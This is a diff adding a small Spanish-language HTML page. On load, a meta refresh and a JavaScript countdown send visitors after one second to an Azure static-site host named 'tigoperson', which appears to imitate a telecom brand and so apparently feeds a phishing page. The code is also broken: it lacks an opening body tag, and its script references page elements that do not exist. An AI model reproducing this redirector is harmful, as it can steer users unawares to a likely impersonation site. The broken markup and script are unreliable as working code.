@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="refresh" content="1;url=https://tigoperson.z13.web.core.windows.net/">
+
+  <script>
+    // ✏️ Cambia esta URL por tu destino
+    const URL_DESTINO = "https://tigoperson.z13.web.core.windows.net/";
+    const SEGUNDOS    = 1;
+
+    let restante = SEGUNDOS;
+    document.getElementById("link").href = URL_DESTINO;
+
+    const intervalo = setInterval(() => {
+      restante--;
+      document.getElementById("count").textContent = restante;
+      document.getElementById("msg").textContent   = restante;
+      if (restante <= 0) {
+        clearInterval(intervalo);
+        window.location.href = URL_DESTINO;
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
